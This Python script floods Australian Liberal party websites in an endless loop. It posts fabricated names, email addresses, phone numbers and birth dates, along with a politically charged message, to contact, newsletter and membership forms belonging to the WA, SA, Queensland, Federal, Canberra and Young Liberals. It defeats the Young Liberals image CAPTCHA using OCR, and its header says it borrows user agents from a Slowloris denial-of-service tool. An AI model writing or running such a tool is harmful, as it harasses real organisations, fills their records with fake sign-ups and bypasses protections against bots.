                                                                                  # -- geoguit -- #
# libs-hit.py, created on the 9th of May, 2020
# Updated on the 21st of June, 2020

# This module sends different packs of data (specified by the 'msg' variable) to Australian Liberal party websites.
# The NSW, Tasmania, and Victora Liberals use reCaptcha protection which we haven't programmed in yet, so that's too bad.
# Some sites like the Canberra and Federal branches of the Liberal party don't have an interactive "contact us" section, so instead the script targets their newsletter registrations.

# The user_agents list is stolen from gkbrk's Python implementation of a Slow Loris DoS @ https://github.com/gkbrk/slowloris/blob/master/slowloris.py.

# P.S: If someone could think of a better way to handle random email address pattern generation that'd be rather helpful as the solution used in this script is a bit ugly.
                                                                                  # -- geoguit -- #

import io
import os
import re
import sys
import json
import string
import base64
import random
import urllib
import requests
import pytesseract
from PIL import Image
from datetime import datetime, timedelta
from subprocess import check_output

def randomString(stringLength):
    letters = string.digits
    return ''.join(random.choice(letters) for i in range(stringLength))

def is_allowed_specific_char(string): # This function checks if a string contains certain disallowed characters, which is used later since the captcha only uses alpha-numeric characters.
    charRe = re.compile(r'[^a-zA-Z0-9.]')
    string = charRe.search(string)
    return not bool(string)

random.seed = (os.urandom(1024))
names = json.loads(open('first-names.json').read())
lastNames = json.loads(open('surnames.json').read())
msg = urllib.parse.quote('Gladys Berejiklian killed all those Koalas.')
pytesseract.pytesseract.tesseract_cmd = 'C:\Program Files\Tesseract-OCR/tesseract.exe'
states = ['ACT', 'NSW', 'NT', 'SA', 'TAS', 'VIC', 'WA', 'QLD']
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",]

sites = json.loads(open('sites.json').read())
roadTypes = ['street', 'st', 'cres', 'crescent', 'road', 'rd', 'bvd', 'boulevard', 'ave', 'avenue']

while True:
    #region Western Australia Liberals
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomString(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    suburb = random.choice(lastNames)
    s = requests.session()
    res = s.post('https://www.waliberal.org.au/contact/', allow_redirects=False, data={
        'et_pb_contact_name_0': fName + ' ' + lName,
        'et_pb_contact_email_0': uName,
        'et_pb_contact_suburb_0': suburb,
        'et_pb_contact_reason_0': 'General Enquiry',
        'et_pb_contact_message_0': msg,
        'et_pb_contactform_submit_0': 'et_contact_proccess',
        '_wpnonce-et-pb-contact-form-submitted-0': '18dea6adc4',
        '_wp_http_referer': '/contact/',
        'et_pb_contact_email_fields_0': urllib.parse.quote('[{"field_id":"et_pb_contact_name_0","original_id":"name","required_mark":"required","field_type":"input","field_label":"Name *"},{"field_id":"et_pb_contact_email_0","original_id":"email","required_mark":"required","field_type":"email","field_label":"Email Address *"},{"field_id":"et_pb_contact_suburb_0","original_id":"suburb","required_mark":"required","field_type":"input","field_label":"Suburb *"},{"field_id":"et_pb_contact_mobile_0","original_id":"mobile","required_mark":"not_required","field_type":"input","field_label":"Mobile"},{"field_id":"et_pb_contact_landline_0","original_id":"landline","required_mark":"not_required","field_type":"input","field_label":"Home Phone"},{"field_id":"et_pb_contact_reason_0","original_id":"reason","required_mark":"required","field_type":"select","field_label":"Select the reason for your enquiry"},{"field_id":"et_pb_contact_message_0","original_id":"message","required_mark":"required","field_type":"text","field_label":"Your message... *"}]'),
        'token': '03AGdBq24Y60DFM4zUBsUZAZFRg4AJ2hmaMEJ6Px8Fal_Yt2UpcDWiW9Yd1uIQu-x8kZHY3JSFF42GJwM8nt6dK2PH0Od6BMqkB8pHTBcA3sz-2JNKvxcVp-uxuxn-6IocX8kV3yMmCbxDPzQNyvoJjjXdEio3BfCxZnaIqvTovS8EsQk7MNxuETI7ETJspd01LuGpo9K3TKzFMxtWSoZT_kRo28YreK8Ojjnu16-XOCERPjLWCfbCy3Ta9WDjT0r9-wdLNUegeC6p3KXi375vIUJVVphomy2KcXTTqTAZScFEv-xhFH726lgvevF9sg-GsEBalTAucPrew9ey6vqj2WWO1o5fK3c1dBvfgmjlKgQbve5Zy35bJLigVokbT11XWAvAMI3Ub5Xm0GsF5d_iHmvneR9fjwWxmFeOmzB5iGFgJswhB3SUPLA'
    })
    print('[WA Liberals] Email: %s, suburb: %s, got status code %s.' % (uName, suburb, res.status_code))
    #endregion

    #region South Australia Liberals
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomString(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    road = randomString(3) + ' ' + random.choice(lastNames) + ' ' + random.choice(roadTypes)
    s = requests.session()
    res = s.post('https://www.saliberal.org.au/forms/feedbacks', allow_redirects=False, data={
        'authenticity_token': 'G++Mtg76Pvy6a+SzQxyjRGae0Ce4ZLSbtxL2CXcTmfI=',
        'page_id': 2694,
        "return_to": "https://www.saliberal.org.au/contact",
        'feedback[content]': msg,
        'feedback[first_name]': fName,
        'feedback[last_name]': lName,
        'feedback[email]': uName,
        'feedback[email_opt_in]': 0,
        'feedback[email_opt_in]': 1,
        'feedback[mobile_opt_in]': 0,
        'feedback[submitted_address]': urllib.parse.quote(road),
        'feedback[is_volunteer]': 0,
        'commit': 'Send Message',
        'authenticity_token': 'G++Mtg76Pvy6a+SzQxyjRGae0Ce4ZLSbtxL2CXcTmfI='
    })
    print('[SA Liberals] Email: %s, road: %s, got status code %s.' % (uName, road, res.status_code))
    #endregion

    #region Queensland LNP
    s = requests.session()
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomString(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    res = s.post('https://www.lnp.org.au/contact-us/', allow_redirects=False, data={
        'input_1.3': fName,
        'input_1.6': lName,
        'input_2': uName,
        'input_3': 'LNP HQ',
        'input_4': 'Message from the Public',
        'input_5': msg,
        'gform_ajax': 'form_id=48&title=&description=1&tabindex=0',
        'is_submit_48': 1,
        'gform_submit': 48,
        'state_48': 'WyJbXSIsIjRmNjIwMGUwNzVkMTZmZjQ5ZGFhNmY5MWE5MTNkNTQ1Il0=',
        'gform_target_page_number_48': 0,
        'gform_source_page_number_48': 1
    })
    print('[Queensland LNP] Email: %s, got status code %s.' % (uName, res.status_code))
    #endregion

    #region Federal Liberals
    s = requests.session()
    site = random.choice(sites)
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomString(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    res = s.post('https://www.liberal.org.au/', allow_redirects=False, data={
        'submitted[email_address]': uName,
        'submitted[postal_code]': msg,
        'submitted[mailchimp][mailchimp_signup]': 1,
        'details[page_num]': 1,
        'details[page_count]': 1,
        'details[finished]': 0,
        'form_build_id': 'form-_6ZRmKDX76ONY0OJwTgHD2Sk_9uBxW1uBF7UGERd-ss',
        'form_id': 'webform_client_form_85218',
        'op': 'Sign Up'
    },
    headers={
        'Referer': site
    })
    print('[Federal Liberals] Email: %s, referer: %s, got status code %s.' % (uName, site, res.status_code))
    #endregion

    #region Canberra Liberals
    timestamp = str((datetime.utcnow() - timedelta(hours=0, minutes=20) - datetime(1970,1,1)).total_seconds())[0:10]
    fName = random.choice(names)
    lName = random.choice(lastNames)

    ext = randomString(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = fName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
            
    elif(selectNm == 1):
        uName = fName.lower() + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])
        
    elif(selectNm == 2):
        uName = fName.lower() + ext + '.' + lName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = fName.lower() + '.' + lName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    agent = random.choice(user_agents)
    s = requests.session()
    res = s.post('https://canberraliberals.org.au/latest-news/?mailoptin-ajax=subscribe_to_email_list', allow_redirects=False, data={
        'optin_data[mo-name]': msg,
        'optin_data[mo-email]': uName,
        'optin_data[optin_uuid]': 'CBvFFyhAVC',
        'optin_data[optin_campaign_id]': '1',
        'optin_data[email]': uName,
        'optin_data[name]': msg,
        'optin_data[_mo_timestamp]': timestamp,
        'optin_data[user_agent]': urllib.parse.quote(agent),
        'optin_data[conversion_page]': urllib.parse.quote('https://canberraliberals.org.au/latest-news/')
    })
    
    print('[Canberra Liberals] Email: %s, timestamp: %s, got status code %s.' % (uName, timestamp, res.status_code))
    #endregion

    #region Young Liberals
    s = requests.Session()
    io.open('ylcaptcha.png', 'wb').write((s.get('https://www.youngliberal.org.au/components/com_chronoforms/chrono_verification.php?imtype=1').content))
    check_output(['magick', '.\ylcaptcha.png', '-resample', '600', '.\ylcaptcha.png'])
    captcha = ''.join(pytesseract.image_to_string(Image.open('ylcaptcha.png')).split())

    if(is_allowed_specific_char(captcha) == False or len(captcha) != 5):
        continue

    rndName = random.choice(names)
    rndLastName = random.choice(lastNames)
    state = random.choice(states)

    ext = randomString(3)
    selectNm = random.randint(0, 3)
    if(selectNm == 0):
        uName = rndName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 1):
        uName = rndName.lower() + '.' + rndLastName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 2):
        uName = rndName.lower() + ext + '.' + rndLastName.lower() + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    elif(selectNm == 3):
        uName = rndName.lower() + '.' + rndLastName.lower() + ext + '@' + random.choice(['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com'])

    ph = urllib.parse.quote('+61') + randomString(10)

    month = str(random.randint(1, 12))
    day = str(random.randint(1, 28))
    if(len(month) == 1):
        month = '0' + month

    if(len(day) == 1):
        day = '0' + day

    response = s.post('https://www.youngliberal.org.au/join?chronoform=join&event=submit', allow_redirects=False, data={
        'firstname': rndName,
        'lastname': rndLastName,
        'email': uName,
        'phone': ph,
        'dob': str(random.randint(1962, 2003)) + '-' + month + '-' + day,
        'address': randomString(2) + ' %s %s, %s, NSW' % (random.choice(lastNames), random.choice(['ave', 'st', 'rd', 'cres', 'avenue', 'street', 'road', 'cresent']), random.choice(lastNames)),
        'state': state,
        'reason': msg,
        'chrono_verification': captcha,
        'submit': 'Submit',
        '7e4dd2885529d34d7b71d4857c5b4bc4': '1'
    })

    if(response.status_code != 200):
        print('Received status code %s, exiting...' % (response.status_code))
        quit()

    print("[Young Liberals] Captcha: \"%s\", name: %s %s, email: %s, state: %s, got status code %s." % (captcha, rndName, rndLastName, uName, state, response.status_code))
    #endregion